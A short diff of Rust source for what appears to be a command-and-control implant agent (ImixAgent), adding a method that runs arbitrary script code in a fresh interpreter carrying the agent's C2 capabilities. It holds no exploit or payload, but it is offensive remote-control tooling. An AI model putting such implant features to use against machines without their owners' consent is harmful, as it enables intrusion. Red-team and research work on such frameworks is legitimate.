@@ -1,4 +1,5 @@
 use anyhow::{Context, Result};
+use eldritch_core::Value;
 use eldritch_libagent::agent::Agent;
 use pb::c2::{self, ClaimTasksRequest};
 use pb::config::Config;
@@ -140,6 +141,18 @@ impl<T: Transport + 'static> ImixAgent<T> {
 
 // Implement the Eldritch Agent Trait
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
+    fn eval(&self, code: String) -> std::result::Result<Value, String> {
+        let agent = self.clone();
+        // Run in a new interpreter instance, fully loaded
+        let mut interp = eldritchv2::Interpreter::new()
+            .with_default_libs()
+            .with_agent(Arc::new(agent));
+
+        // Separate environment means separate variables, so this is correct.
+        // We do not share the environment of the caller.
+        interp.interpret(&code).map_err(|e| e.to_string())
+    }
+
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
         self.block_on(async {
             let mut t = self
